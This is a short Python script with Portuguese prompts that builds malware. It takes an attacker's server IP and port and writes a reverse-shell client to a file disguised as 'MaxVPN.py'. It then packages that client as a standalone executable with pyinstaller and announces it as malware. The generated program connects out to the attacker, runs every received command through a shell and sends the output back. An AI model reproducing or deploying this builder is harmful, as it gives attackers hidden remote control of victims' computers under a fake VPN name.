import sys
import os

hosta = input("digite o IP do seu servidor: ")
porta = int(input("a porta do seu servidor: "))

codigo = f"""
import subprocess
import socket
host = "{hosta}"
port = {porta}

bot = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
bot.connect((host,port))

while True:
    cmd = bot.recv(1024)
    cmd2 = cmd.decode()
    if cmd2 == "sair":
       break
    
    resultado = subprocess.check_output(cmd2, shell=True,stderr=subprocess.STDOUT)
    bot.send(resultado)
bot.close()    
"""

with open("MaxVPN.py", "w") as file:
            file.write(codigo)
print("Codigo gerado com sucesso veja um arquivo novo")            
os.system("pyinstaller --onefile MaxVPN.py ")
print("[Malware] Gerado em dist")
